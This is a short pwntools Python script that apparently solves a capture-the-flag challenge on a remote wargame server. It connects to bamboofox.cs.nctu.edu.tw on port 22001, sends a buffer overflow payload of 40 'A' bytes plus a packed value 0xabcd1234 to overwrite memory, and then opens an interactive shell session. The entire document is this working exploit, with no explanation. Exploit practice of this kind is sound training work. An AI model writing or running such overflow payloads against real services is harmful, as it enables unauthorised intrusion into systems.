from pwn import *



r = remote('bamboofox.cs.nctu.edu.tw',22001)

r.sendline(b'A'*40+p32(0xabcd1234)+b'\x00')


r.interactive()